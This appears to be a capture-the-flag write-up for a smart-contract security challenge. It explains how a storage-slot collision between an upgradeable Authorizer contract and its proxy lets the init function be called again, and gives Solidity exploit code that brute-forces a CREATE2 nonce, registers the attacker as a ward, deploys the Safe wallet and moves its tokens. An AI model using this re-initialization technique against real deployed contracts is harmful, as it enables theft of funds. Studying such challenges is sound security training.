## A storage collision between `AuthorizerUpgradeable` contract and its `TransparentProxy` allows an attacker to re-initialize the `AuthorizerUpgradeable` contract and set arbitrary values to the `wards` map

This challenge can be divided in 2 parts. 

The first one is to find a way to "guess" the nonce used the get the wrecked Safe wallet address. This can be done by simply use brute force to test different nonces until achieve the one that outputs the aim address:
```solidity
    for(uint256 i = 0; i<100; i++) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
        address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, codeHash))))); // SENDER IS PROXY FACTORY
        if(predictedAddress==USER_DEPOSIT_ADDRESS) guessedNonce = i;
    }
``` 

Now let's go with the second (and most fun) part:
Once we have the correct nonce, we have to find a way to create the wallet via `drop` function of the implementation contract. The problem is that only an authorized `ward` can use such function the create the Safe wallet and get the correspondant reward. 

The `AuthorizerUpgradeable` implementation contract has a state variable, `needsInit`, which is supposed to be set to 0 after the contract is initialized, preventing further calls to the `init()` function. The proxy contract, however, also has a state variable, `upgrader`, at the same storage slot.

The deployment flow for the Authorizer contract is as follows:
1. The `AuthorizerFactory` deploys the implementation contract.
2. The `init()` function is called, setting the `needsInit` variable to 0.
3. The `TransparentProxy` is deployed, referencing the implementation.
4. `setUpgrader()` function is then called on the proxy. This function modifies the `upgrader` variable in storage slot 0.

Since the `needsInit` and `upgrader` variables occupy the same storage slot, modifying `upgrader` also changes the value of `needsInit` from 0 to a non-zero value.

This change effectively re-enables the `init()` function on the Authorizer contract, as the require statement that checks if `needsInit` is 0 no longer reverts.


With all this known, the hole attack vector will be:

1. Guess the nonce ussed to pre-calculate the target Safe wallet address.
2. Call `init()` on the Authorizer to register the attacker's address as a valid ward. This is possible due to the storage collision.
3. Call `drop()` on the Authorizer as the newly-registered ward to create the Safe and claim the creation reward.
4. Transfer the tokens from the newly created Safe wallet to the intended user.
5. Transfer the creation award to the ward

As the challenge requires to make this in a single tx, we implement the logic on a contract constructor to make a single transaction -> the contract deployment. 

## PoC
On the test suite we apply the "off-chain" logic -> guess the nonce and prepare the call the recover the funds from the Safe wallet: 
```solidity
    function test_walletMining() public 
    checkSolvedByPlayer 
    {  
    // 1. Guess the nonce by brute force 
    address[] memory owners = new address[](1); 
    owners[0] = user;
    bytes memory initializer = abi.encodeCall(Safe.setup, (owners, 1, address(0), '', address(0), address(0),  0, payable(address(0)))); // I suppose is this, because is the initializer function of the Safe
    bytes memory initCode = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))); // 
    bytes32 codeHash = keccak256(initCode);

    uint256 guessedNonce;
    
    for(uint256 i = 0; i<100; i++) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
        address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, codeHash))))); // SENDER IS PROXY FACTORY
        if(predictedAddress==USER_DEPOSIT_ADDRESS) guessedNonce = i;
    }

    // 2. Create signed calldata for execTransaction on Safe (this is what will transfer the 20M) -> we can make this because we have access to the PK of the wallet owner
        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
        // Calculate transaction hash
        bytes32 safeTxHash = keccak256(
            abi.encode(
                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                address(token),
                0,
                keccak256(data),
                Enum.Operation.Call,
                100000,
                100000,
                0,
                address(0),
                address(0),
                0 // nonce of the Safe (first transaction)
            )
        );
        bytes32 domainSeparator = keccak256(abi.encode(
            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
            singletonCopy.getChainId(), 
            USER_DEPOSIT_ADDRESS
        ));
        // Sign the transaction
        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signatures = abi.encodePacked(r, s, v);
        // Create execution data
        bytes memory execData = abi.encodeWithSelector(
            singletonCopy.execTransaction.selector, 
            address(token), 
            0, 
            data, 
            Enum.Operation.Call, 
            100000, 
            100000, 
            0, 
            address(0), 
            address(0), 
            signatures
        );

        // 3. We pass all the data the EXPLOITER constructor the perform the attack on a single transaction
        new EXPLOITER(
            USER_DEPOSIT_ADDRESS,
            authorizer,
            walletDeployer,
            initializer,
            guessedNonce,
            execData,
            token,
            ward
        );
}
```

The real attack is on the `EXPLOITER` constructor:
```solidity
contract EXPLOITER {
    constructor(
        address USER_DEPOSIT_ADDRESS,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory initializer,
        uint256 guessedNonce,
        bytes memory execData,
        DamnValuableToken token,
        address ward
    ) {
        // Re-init the Authorizer and call drop 
        address[] memory users = new address[](1);
        address[] memory aims = new address[](1);
        users[0] = address(this);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(users, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS,initializer, guessedNonce); 

        // Transfer 20M to the user 
        address(USER_DEPOSIT_ADDRESS).call(execData);
        // transfer creation reward to ward
        token.transfer(ward, 1e18);
    }
}
```